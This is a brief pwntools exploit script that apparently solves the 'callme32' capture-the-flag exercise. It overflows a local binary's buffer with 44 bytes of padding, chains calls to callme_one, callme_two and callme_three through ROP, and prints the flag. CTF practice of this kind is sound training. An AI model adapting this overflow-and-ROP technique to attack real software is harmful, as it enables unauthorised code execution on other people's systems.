#!/usr/bin/python

from pwn import *

e = ELF('./callme32')

rop = ROP(e)

rop.callme_one(1, 2, 3)
rop.callme_two(1, 2, 3)
rop.callme_three(1, 2, 3)

r = process(e.path)
r.recvuntil('>')
r.sendline("A"*44 + str(rop))

r.recv()
r.send('\n')
log.success("Flag: " + r.recv())








